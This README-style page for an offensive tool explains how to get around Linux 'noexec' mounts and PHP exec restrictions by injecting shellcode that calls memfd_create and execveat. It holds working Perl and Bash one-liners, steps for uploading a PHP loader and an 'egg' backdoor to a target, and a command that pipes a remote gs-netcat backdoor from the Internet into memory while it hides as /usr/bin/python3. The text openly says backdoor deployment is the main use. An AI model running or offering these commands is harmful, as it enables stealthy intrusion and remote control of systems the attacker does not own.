## Circumvent the `noexec` mount flag on Linux and execute abritrary binaries

This if useful on a Linux system when all writeable locations are mounted with `-o noexec` (including /dev/shm) or to escape PHP's 'exec' restrictions.

Use _one_ of the 3 scripts (perl, bash, php):

- The binary does not need to have +x
- The binary can reside on a noexec-partition
- Mostly the binary can be piped directly from the Internet into the memory (and executed there)
- Works as non-root user
- The PHP variant also circumvents PHP's "exec" restrictions.
- It injects shellcode into the running process and calls [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) and [execveat(2)](https://man7.org/linux/man-pages/man2/execveat.2.html) to load a binary from a noexec-partition (or directly from the Internet).
- BASH and PHP do not support SYSCALLS. We advanced an old trick.

`TIME_STYLE` and `-lah` are used as an example to pass through environment parameters and command line options. 

### PERL example:
```sh
# From memexec-perl.sh
memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
cat /bin/ls | TIME_STYLE=+%s memexec -lah
```
This was golfed by the fine people on Mastodon ([@acut3hack](https://@acut3hack@infosec.exchange), [@addision](https://@addison@nothing-ever.works), [@ilv](https://@ilv@infosec.exchange))

### BASH example (by [@messede-degod](https://github.com/messede-degod)):
```sh
source memexec-bash.sh
cat /bin/ls | TIME_STYLE=+%s memexec -- -lah
```

### The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/).

1. Upload `memexec.php` and `egg` (your backdoor) onto the target
2. Call `curl -SsfL https://target/memexec.php` to execute `egg` and bypassing noexec restrictions

(This is my way of saying "hey. how are to?" to my old [team-teso](https://en.wikipedia.org/wiki/TESO_(Austrian_hacker_group)) colleague and long time PHP developer [@i0nic](https://x.com/i0n1c))

The educated reader understands that this is mostly used to pipe a backdoor from the Internet directly into memory, even when execution is prohobited by `noexec` or there is no writeable directory (hides as process name `/usr/bin/python3`):
```shell
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilD -s ChangeMe" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
```

For the addicts, here is the nasm of the shellcode (memfd_create, copy loop & execveat):
```nasm
; nasm -felf64 memexec.nasm && ld memexec.o &&  ./a.out
; cat /bin/ls | TIME_STYLE=+%s ./a.out -- -lah
